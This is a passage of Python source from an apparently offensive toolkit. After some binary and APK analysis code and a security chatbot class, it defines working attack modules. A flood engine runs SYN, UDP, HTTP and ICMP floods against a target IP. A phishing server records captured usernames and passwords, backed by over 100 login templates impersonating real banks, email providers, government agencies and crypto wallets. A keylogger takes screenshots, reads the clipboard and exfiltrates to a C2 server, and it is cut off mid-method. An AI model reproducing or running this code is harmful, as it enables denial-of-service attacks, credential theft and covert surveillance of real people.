                for entry in pe.DIRECTORY_ENTRY_IMPORT:
                    result['imports'].append(entry.dll.decode())
            
            if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
                for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                    if exp.name:
                        result['exports'].append(exp.name.decode())
            
        except Exception as e:
            logger.error(f"PE analysis error: {e}")
        
        return result
    
    def _disassemble(self, file_path: str) -> List[Dict]:
        """Disassemble binary using capstone"""
        instructions = []
        try:
            md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
            
            with open(file_path, 'rb') as f:
                code = f.read()
            
            for insn in md.disasm(code, 0x1000):
                instructions.append({
                    'address': hex(insn.address),
                    'mnemonic': insn.mnemonic,
                    'op_str': insn.op_str
                })
                
                if len(instructions) >= 1000:
                    break
                    
        except Exception as e:
            logger.error(f"Disassembly error: {e}")
        
        return instructions
    
    def _check_vulnerabilities(self, result: Dict) -> List[Dict]:
        """Check for common vulnerabilities"""
        vulns = []
        
        # Check for dangerous functions
        dangerous_funcs = ['strcpy', 'strcat', 'sprintf', 'gets', 'scanf', 'memcpy']
        for imp in result.get('imports', []):
            for func in dangerous_funcs:
                if func in imp.lower():
                    vulns.append({
                        'type': 'dangerous_function',
                        'description': f'Potentially dangerous function: {imp}',
                        'severity': 'medium'
                    })
        
        # Check for high entropy sections (packing)
        for section in result.get('sections', []):
            if section.get('entropy', 0) > 7.0:
                vulns.append({
                    'type': 'packed_section',
                    'description': f'Section {section.get("name")} has high entropy (possibly packed)',
                    'severity': 'low'
                })
        
        return vulns

# ============================================================
# APK ANALYSIS ENGINE
# ============================================================
class APKAnalysisEngine:
    """APK analysis and disassembly"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def analyze_apk(self, apk_path: str) -> Dict:
        """Analyze an APK file"""
        if not os.path.exists(apk_path):
            return {'success': False, 'error': f'File not found: {apk_path}'}
        
        result = {
            'success': True,
            'file_path': apk_path,
            'package_name': 'unknown',
            'version': 'unknown',
            'main_activity': 'unknown',
            'permissions': [],
            'activities': [],
            'services': [],
            'receivers': [],
            'providers': [],
            'libraries': [],
            'certificate': {}
        }
        
        try:
            # Extract APK
            extract_dir = os.path.join(APK_ANALYSIS_DIR, f"apk_{int(time.time())}")
            os.makedirs(extract_dir, exist_ok=True)
            
            with zipfile.ZipFile(apk_path, 'r') as z:
                z.extractall(extract_dir)
            
            # Parse AndroidManifest.xml
            manifest_path = os.path.join(extract_dir, 'AndroidManifest.xml')
            if os.path.exists(manifest_path):
                result.update(self._parse_manifest(manifest_path))
            
            # List libraries
            lib_dir = os.path.join(extract_dir, 'lib')
            if os.path.exists(lib_dir):
                for root, dirs, files in os.walk(lib_dir):
                    for f in files:
                        if f.endswith('.so'):
                            result['libraries'].append(f)
            
            # Check certificate
            cert_dir = os.path.join(extract_dir, 'META-INF')
            if os.path.exists(cert_dir):
                for f in os.listdir(cert_dir):
                    if f.endswith('.RSA') or f.endswith('.DSA'):
                        result['certificate']['file'] = f
            
            # Clean up
            shutil.rmtree(extract_dir, ignore_errors=True)
            
            # Save to database
            self.db.save_apk_analysis(
                apk_path,
                result['package_name'],
                json.dumps(result),
                True
            )
            
        except Exception as e:
            result['success'] = False
            result['error'] = str(e)
        
        return result
    
    def _parse_manifest(self, manifest_path: str) -> Dict:
        """Parse AndroidManifest.xml"""
        result = {}
        
        try:
            # Try using aapt if available
            if shutil.which('aapt'):
                aapt_result = subprocess.run(
                    ['aapt', 'dump', 'xmltree', manifest_path],
                    capture_output=True, text=True
                )
                
                if aapt_result.stdout:
                    output = aapt_result.stdout
                    
                    # Extract package name
                    pkg_match = re.search(r'package="([^"]+)"', output)
                    if pkg_match:
                        result['package_name'] = pkg_match.group(1)
                    
                    # Extract version
                    ver_match = re.search(r'versionName="([^"]+)"', output)
                    if ver_match:
                        result['version'] = ver_match.group(1)
                    
                    # Extract permissions
                    perms = re.findall(r'name="android\.permission\.([^"]+)"', output)
                    result['permissions'] = list(set(perms))
                    
                    # Extract activities
                    activities = re.findall(r'activity.*?name="([^"]+)"', output, re.DOTALL)
                    result['activities'] = list(set(activities))
                    
                    # Extract services
                    services = re.findall(r'service.*?name="([^"]+)"', output, re.DOTALL)
                    result['services'] = list(set(services))
            
        except Exception as e:
            logger.error(f"Manifest parsing error: {e}")
        
        return result

# ============================================================
# CYBERSECURITY LLM ENGINE
# ============================================================
class CybersecurityLLM:
    """Cybersecurity LLM for analysis and assistance"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.model = None
        self.api_key = config.get('llm.api_key', '')
        self.api_url = config.get('llm.api_url', '')
        self.local_model_path = config.get('llm.local_model_path', '')
    
    def query(self, prompt: str, context: str = "") -> Dict:
        """Query the LLM"""
        full_prompt = f"Context: {context}\n\nQuestion: {prompt}\n\nAnswer as a cybersecurity expert:"
        
        # Try API first
        if self.api_key and self.api_url:
            try:
                response = self._query_api(full_prompt)
                if response:
                    self.db.save_llm_conversation(prompt, response, context)
                    return {'success': True, 'response': response}
            except Exception as e:
                logger.error(f"LLM API error: {e}")
        
        # Fall back to rule-based response
        response = self._rule_based_response(prompt, context)
        self.db.save_llm_conversation(prompt, response, context)
        
        return {'success': True, 'response': response}
    
    def _query_api(self, prompt: str) -> Optional[str]:
        """Query external LLM API"""
        try:
            headers = {
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {self.api_key}'
            }
            
            data = {
                'model': self.config.get('llm.model', 'gpt-4'),
                'messages': [
                    {'role': 'system', 'content': 'You are a cybersecurity expert assistant.'},
                    {'role': 'user', 'content': prompt}
                ],
                'max_tokens': self.config.get('llm.max_tokens', 4096),
                'temperature': self.config.get('llm.temperature', 0.7)
            }
            
            response = requests.post(self.api_url, headers=headers, json=data, timeout=60)
            
            if response.status_code == 200:
                result = response.json()
                return result.get('choices', [{}])[0].get('message', {}).get('content', '')
            
        except Exception as e:
            logger.error(f"API query error: {e}")
        
        return None
    
    def _rule_based_response(self, prompt: str, context: str) -> str:
        """Generate rule-based response"""
        prompt_lower = prompt.lower()
        
        # Check for common cybersecurity topics
        topics = {
            'nmap': """Nmap is a powerful network scanning tool. Common commands:
• nmap -sS target - SYN scan (stealth)
• nmap -sV target - Service version detection
• nmap -O target - OS detection
• nmap -p- target - Scan all ports
• nmap --script vuln target - Run vulnerability scripts""",
            
            'sql injection': """SQL Injection prevention:
• Use parameterized queries
• Validate and sanitize input
• Use ORM frameworks
• Apply principle of least privilege
• Use WAF (Web Application Firewall)""",
            
            'xss': """Cross-Site Scripting (XSS) prevention:
• Encode output
• Validate input
• Use Content Security Policy (CSP)
• Use HTTPOnly cookies
• Sanitize user input""",
            
            'password': """Password security best practices:
• Use strong passwords (12+ characters)
• Enable 2FA/MFA
• Use a password manager
• Never reuse passwords
• Implement account lockout policies""",
            
            'firewall': """Firewall best practices:
• Default deny policy
• Only allow necessary ports
• Log all denied traffic
• Regular rule reviews
• Use defense in depth""",
            
            'encryption': """Encryption best practices:
• Use AES-256 for symmetric encryption
• Use RSA-2048+ for asymmetric encryption
• Use TLS 1.2+ for network traffic
• Proper key management
• Never hardcode keys""",
            
            'pentest': """Penetration testing methodology:
1. Reconnaissance
2. Scanning & Enumeration
3. Vulnerability Analysis
4. Exploitation
5. Post-Exploitation
6. Reporting""",
            
            'owasp': """OWASP Top 10 (2021):
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Data Integrity Failures
9. Logging Failures
10. SSRF"""
        }
        
        for topic, response in topics.items():
            if topic in prompt_lower:
                return response
        
        return """I'm a cybersecurity expert assistant. I can help with:
• Network scanning (Nmap, ping, traceroute)
• Web application security (SQLi, XSS, CSRF)
• Password security and authentication
• Encryption and cryptography
• Firewall and network security
• Penetration testing methodology
• Vulnerability analysis
• Security best practices

Please ask a specific cybersecurity question for detailed guidance."""

# ============================================================
# DOS ENGINE
# ============================================================
class DOSEngine:
    """DOS/DDOS attack engine"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        """SYN flood attack"""
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        """UDP flood attack"""
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        """HTTP flood attack"""
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        """ICMP flood attack"""
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        """Execute DOS attack"""
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'output': f'Invalid IP: {target_ip}'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        packets_sent = 0
        
        def attack_thread():
            nonlocal packets_sent
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent, 'completed', 'system')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return {
            'success': True,
            'output': f"💥 {attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        """Get attack function"""
        funcs = {
            'syn': self._send_syn,
            'udp': self._send_udp,
            'http': self._send_http,
            'icmp': self._send_icmp
        }
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        """Send SYN packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        """Send UDP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"Y" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        """Send HTTP request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "YONG-NIAN-V1"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        """Send ICMP packet"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        """Stop DOS attack"""
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        """Get active attacks"""
        return [
            {'id': attack_id, 'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
             'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'}
            for attack_id in self.running_attacks.keys()
        ]

# ============================================================
# PHISHING SERVER
# ============================================================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    """HTTP handler for phishing pages"""
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        
        if self.server_instance and self.server_instance.html_content:
            self.wfile.write(self.server_instance.html_content.encode())
        
        if self.server_instance and self.server_instance.db and self.server_instance.link_id:
            self.server_instance.db.conn.execute(
                "UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?",
                (self.server_instance.link_id,)
            )
            self.server_instance.db.conn.commit()
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        form_data = urllib.parse.parse_qs(post_data)
        
        username = form_data.get('email', form_data.get('username', ['']))[0]
        password = form_data.get('password', [''])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if self.server_instance and self.server_instance.db and username and password:
            self.server_instance.db.save_captured_credential(
                self.server_instance.link_id, username, password, client_ip, user_agent
            )
            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
            print(f"  IP: {client_ip}")
            print(f"  Username: {username}")
            print(f"  Password: {password}")
        
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

class PhishingServer:
    """Phishing server for hosting phishing pages"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
        self.port = None
    
    def start(self, link_id: str, html_content: str, port: int = 8080) -> bool:
        """Start phishing server"""
        try:
            self.link_id = link_id
            self.html_content = html_content
            self.port = port
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            logger.info(f"Phishing server started on port {port}")
            return True
        except Exception as e:
            logger.error(f"Phishing server error: {e}")
            return False
    
    def stop(self):
        """Stop phishing server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
            logger.info("Phishing server stopped")
    
    def get_url(self) -> str:
        """Get phishing URL"""
        return f"http://{self._get_local_ip()}:{self.port}"
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# ============================================================
# SOCIAL ENGINEERING TOOLS (100+ Templates)
# ============================================================
class SocialEngineeringTools:
    """Social engineering and phishing tools"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict[str, str]:
        """Load all phishing templates (100+)"""
        templates = {}
        
        # Social Media (20)
        social_media = [
            ('facebook', '#1877f2', 'Facebook'), ('instagram', '#0095f6', 'Instagram'),
            ('twitter', '#1d9bf0', 'X / Twitter'), ('linkedin', '#0a66c2', 'LinkedIn'),
            ('snapchat', '#fffc00', 'Snapchat'), ('tiktok', '#fe2c55', 'TikTok'),
            ('reddit', '#ff4500', 'Reddit'), ('pinterest', '#e60023', 'Pinterest'),
            ('tumblr', '#36465d', 'Tumblr'), ('flickr', '#ff0084', 'Flickr'),
            ('youtube', '#ff0000', 'YouTube'), ('twitch', '#9146ff', 'Twitch'),
            ('discord', '#5865f2', 'Discord'), ('telegram', '#2aabee', 'Telegram'),
            ('whatsapp', '#25d366', 'WhatsApp'), ('wechat', '#07c160', 'WeChat'),
            ('line', '#00c300', 'LINE'), ('viber', '#7360f2', 'Viber'),
            ('mastodon', '#6364ff', 'Mastodon'), ('threads', '#000000', 'Threads')
        ]
        for name, color, display in social_media:
            templates[name] = self._social_template(display, color)
        
        # Email Providers (10)
        email_providers = [
            ('gmail', '#1a73e8', 'Gmail'), ('yahoo', '#410093', 'Yahoo Mail'),
            ('outlook', '#0078d4', 'Outlook'), ('protonmail', '#505061', 'ProtonMail'),
            ('zoho', '#e42527', 'Zoho Mail'), ('icloud', '#0071e3', 'iCloud'),
            ('aol', '#ff0b00', 'AOL Mail'), ('gmx', '#1c449b', 'GMX'),
            ('mailcom', '#0066cc', 'Mail.com'), ('yandex', '#ff0000', 'Yandex Mail')
        ]
        for name, color, display in email_providers:
            templates[name] = self._social_template(display, color)
        
        # Tech Companies (15)
        tech_companies = [
            ('microsoft', '#0078d4', 'Microsoft'), ('google', '#4285f4', 'Google'),
            ('apple', '#0071e3', 'Apple'), ('amazon', '#ff9900', 'Amazon'),
            ('github', '#24292f', 'GitHub'), ('gitlab', '#fc6d26', 'GitLab'),
            ('bitbucket', '#0052cc', 'Bitbucket'), ('adobe', '#ff0000', 'Adobe'),
            ('dropbox', '#0061ff', 'Dropbox'), ('slack', '#611f69', 'Slack'),
            ('zoom', '#2d8cff', 'Zoom'), ('teams', '#5059e8', 'Microsoft Teams'),
            ('onedrive', '#0078d4', 'OneDrive'), ('office365', '#0078d4', 'Office 365'),
            ('salesforce', '#00a1e0', 'Salesforce')
        ]
        for name, color, display in tech_companies:
            templates[name] = self._social_template(display, color)
        
        # Financial (20)
        financial = [
            ('paypal', '#0070ba', 'PayPal'), ('venmo', '#008cff', 'Venmo'),
            ('cashapp', '#00d632', 'Cash App'), ('chase', '#1174c2', 'Chase'),
            ('wellsfargo', '#bc1f2c', 'Wells Fargo'), ('bankofamerica', '#e31837', 'Bank of America'),
            ('citibank', '#003b70', 'Citibank'), ('capitalone', '#004977', 'Capital One'),
            ('americanexpress', '#006fcf', 'American Express'), ('discover', '#ff6000', 'Discover'),
            ('barclays', '#00aeef', 'Barclays'), ('hsbc', '#db0011', 'HSBC'),
            ('revolut', '#0075eb', 'Revolut'), ('monzo', '#ff3464', 'Monzo'),
            ('stripe', '#635bff', 'Stripe'), ('square', '#000000', 'Square'),
            ('coinbase', '#0052ff', 'Coinbase'), ('binance', '#f0b90b', 'Binance'),
            ('kraken', '#5741d9', 'Kraken'), ('metamask', '#f6851b', 'MetaMask')
        ]
        for name, color, display in financial:
            templates[name] = self._social_template(display, color)
        
        # Gaming (10)
        gaming = [
            ('steam', '#67c1f5', 'Steam'), ('epicgames', '#000000', 'Epic Games'),
            ('roblox', '#e32c2c', 'Roblox'), ('minecraft', '#6b8c42', 'Minecraft'),
            ('xbox', '#107c10', 'Xbox'), ('playstation', '#003791', 'PlayStation'),
            ('nintendo', '#e60012', 'Nintendo'), ('battlenet', '#0074e0', 'Battle.net'),
            ('ubisoft', '#0070ff', 'Ubisoft'), ('ea', '#ff0000', 'EA Games')
        ]
        for name, color, display in gaming:
            templates[name] = self._social_template(display, color)
        
        # Dating (10)
        dating = [
            ('tinder', '#ff5a60', 'Tinder'), ('bumble', '#ff6b6b', 'Bumble'),
            ('hinge', '#1a1a1a', 'Hinge'), ('okcupid', '#ff4e6b', 'OkCupid'),
            ('match', '#ff6b6b', 'Match.com'), ('plentyoffish', '#ff6b6b', 'Plenty of Fish'),
            ('grindr', '#ffcc00', 'Grindr'), ('her', '#ff6b6b', 'HER'),
            ('coffeemeetsbagel', '#ff6b6b', 'Coffee Meets Bagel'), ('happn', '#ff6b6b', 'Happn')
        ]
        for name, color, display in dating:
            templates[name] = self._social_template(display, color)
        
        # Streaming (10)
        streaming = [
            ('netflix', '#e50914', 'Netflix'), ('spotify', '#1ed760', 'Spotify'),
            ('hulu', '#1ce783', 'Hulu'), ('disneyplus', '#113ccf', 'Disney+'),
            ('hbomax', '#5822b4', 'HBO Max'), ('primevideo', '#00a8e1', 'Prime Video'),
            ('appletv', '#000000', 'Apple TV+'), ('paramount', '#0064ff', 'Paramount+'),
            ('peacock', '#000000', 'Peacock'), ('crunchyroll', '#f47521', 'Crunchyroll')
        ]
        for name, color, display in streaming:
            templates[name] = self._social_template(display, color)
        
        # Shopping (10)
        shopping = [
            ('ebay', '#e53238', 'eBay'), ('walmart', '#0071dc', 'Walmart'),
            ('target', '#cc0000', 'Target'), ('bestbuy', '#0046be', 'Best Buy'),
            ('etsy', '#f1641e', 'Etsy'), ('aliexpress', '#ff6a00', 'AliExpress'),
            ('alibaba', '#ff6a00', 'Alibaba'), ('wish', '#2fb7ec', 'Wish'),
            ('shein', '#000000', 'Shein'), ('temu', '#fb7701', 'Temu')
        ]
        for name, color, display in shopping:
            templates[name] = self._social_template(display, color)
        
        # Cloud & Services (10)
        cloud = [
            ('aws', '#ff9900', 'AWS'), ('azure', '#0078d4', 'Azure'),
            ('gcp', '#4285f4', 'Google Cloud'), ('digitalocean', '#0080ff', 'DigitalOcean'),
            ('cloudflare', '#f38020', 'Cloudflare'), ('namecheap', '#de3723', 'Namecheap'),
            ('godaddy', '#00a4a6', 'GoDaddy'), ('heroku', '#430098', 'Heroku'),
            ('vercel', '#000000', 'Vercel'), ('netlify', '#00c7b7', 'Netlify')
        ]
        for name, color, display in cloud:
            templates[name] = self._social_template(display, color)
        
        # Education (5)
        education = [
            ('coursera', '#0056d2', 'Coursera'), ('udemy', '#a435f0', 'Udemy'),
            ('edx', '#02262b', 'edX'), ('khanacademy', '#14bf96', 'Khan Academy'),
            ('duolingo', '#58cc71', 'Duolingo')
        ]
        for name, color, display in education:
            templates[name] = self._social_template(display, color)
        
        # Government (5)
        government = [
            ('irs', '#003366', 'IRS'), ('dmv', '#003366', 'DMV'),
            ('usps', '#333366', 'USPS'), ('fedex', '#4d148c', 'FedEx'),
            ('ups', '#351c15', 'UPS')
        ]
        for name, color, display in government:
            templates[name] = self._social_template(display, color)
        
        # VPN & Security (5)
        vpn_security = [
            ('nordvpn', '#4687ff', 'NordVPN'), ('expressvpn', '#da3940', 'ExpressVPN'),
            ('surfshark', '#1ebfbf', 'Surfshark'), ('lastpass', '#d32d27', 'LastPass'),
            ('1password', '#0572ec', '1Password')
        ]
        for name, color, display in vpn_security:
            templates[name] = self._social_template(display, color)
        
        # Custom template
        templates['custom'] = self._custom_template()
        
        return templates
    
    def _social_template(self, display_name: str, color: str) -> str:
        """Generate a social media phishing template"""
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>{display_name} - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a1a 0%, #0f0f2a 50%, #1a1a3a 100%);
            display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .login-container {{ background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(20px);
            border-radius: 16px; padding: 40px; width: 400px; max-width: 90%;
            box-shadow: 0 20px 60px rgba(0, 255, 255, 0.2); border: 1px solid rgba(0, 255, 255, 0.2); }}
        .logo {{ text-align: center; margin-bottom: 30px; }}
        .logo-text {{ font-size: 32px; font-weight: bold; color: {color}; text-shadow: 0 0 20px {color}; }}
        .form-group {{ margin-bottom: 20px; }}
        input {{ width: 100%; padding: 15px; background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(0, 255, 255, 0.2); border-radius: 8px; color: #fff;
            font-size: 16px; transition: all 0.3s; }}
        input:focus {{ outline: none; border-color: {color}; box-shadow: 0 0 15px {color}40; }}
        input::placeholder {{ color: rgba(255, 255, 255, 0.4); }}
        button {{ width: 100%; padding: 15px; background: linear-gradient(135deg, {color}, {color}cc);
            border: none; border-radius: 8px; color: #fff; font-size: 18px; font-weight: bold;
            cursor: pointer; transition: all 0.3s; }}
        button:hover {{ transform: translateY(-2px); box-shadow: 0 10px 30px {color}60; }}
        .warning {{ margin-top: 20px; padding: 12px; background: rgba(0, 255, 255, 0.1);
            border: 1px solid rgba(0, 255, 255, 0.3); border-radius: 8px; color: #6bc;
            text-align: center; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo"><div class="logo-text">{display_name}</div></div>
        <form method="POST" action="">
            <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
            <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
            <button type="submit">Log In</button>
        </form>
        <div class="warning">⚠️ Security test page - Do not enter real credentials</div>
    </div>
</body>
</html>'''
    
    def _custom_template(self) -> str:
        """Generate a custom phishing template"""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: linear-gradient(135deg, #0a0a1a 0%, #0f0f2a 50%, #1a1a3a 100%);
            display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px);
            border-radius: 16px; padding: 40px; width: 400px; max-width: 90%;
            box-shadow: 0 20px 60px rgba(0, 255, 255, 0.3); border: 1px solid rgba(0, 255, 255, 0.2); }
        .logo { text-align: center; margin-bottom: 30px; font-size: 28px; color: #00ffff;
            text-shadow: 0 0 20px #00ffff; font-weight: bold; }
        input { width: 100%; padding: 15px; margin: 10px 0; background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(0, 255, 255, 0.2); border-radius: 8px; color: #fff;
            font-family: 'Courier New', monospace; font-size: 16px; }
        input:focus { outline: none; border-color: #00ffff; box-shadow: 0 0 15px rgba(0, 255, 255, 0.5); }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #00ffff, #00cccc);
            border: none; border-radius: 8px; color: #000; font-size: 18px; font-weight: bold;
            cursor: pointer; font-family: 'Courier New', monospace; margin-top: 10px; }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0, 255, 255, 0.5); }
        .warning { margin-top: 20px; padding: 12px; background: rgba(0, 255, 255, 0.1);
            border: 1px solid rgba(0, 255, 255, 0.3); border-radius: 8px; color: #6bc;
            text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🔒 YONG-NIAN SECURE</div>
        <form method="POST" action="">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">AUTHENTICATE</button>
        </form>
        <div class="warning">🔒 This is a security test page</div>
    </div>
</body>
</html>'''
    
    def generate_phishing_link(self, platform: str, host_ip: str = None, host_port: int = None) -> Dict:
        """Generate a phishing link"""
        link_id = str(uuid.uuid4())[:8]
        template = self.templates.get(platform, self._custom_template())
        
        if callable(template):
            html = template()
        else:
            html = template
        
        local_ip = host_ip or NetworkTools.get_local_ip()
        port = host_port or self.config.get('phishing.default_port', 8080)
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://{local_ip}:{port}",
            template=platform,
            created_at=datetime.now().isoformat(),
            host_ip=local_ip,
            host_port=port
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html, 'port': port}
        
        return {'success': True, 'link_id': link_id, 'platform': platform, 'url': f"http://{local_ip}:{port}"}
    
    def start_server(self, link_id: str, port: int = None) -> bool:
        """Start phishing server"""
        if link_id not in self.active_links:
            return False
        
        link_data = self.active_links[link_id]
        port = port or link_data.get('port', 8080)
        
        return self.phishing_server.start(link_id, link_data['html'], port)
    
    def stop_server(self):
        """Stop phishing server"""
        self.phishing_server.stop()
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def list_templates(self) -> List[str]:
        """List all templates"""
        return list(self.templates.keys())
    
    def shorten_link(self, url: str) -> Optional[str]:
        """Shorten a URL"""
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                return s.tinyurl.short(url)
            except:
                pass
        return None

# ============================================================
# KEYLOGGER MODULE
# ============================================================
class KeyloggerModule:
    """Advanced keylogger module"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
    
    def start(self):
        """Start keylogger"""
        if not KEYLOGGER_AVAILABLE:
            print(f"{Colors.ERROR}❌ Keylogger not available (pynput required){Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Keylogger started (F10 to stop){Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        """Stop keylogger"""
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        """Handle key press"""
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
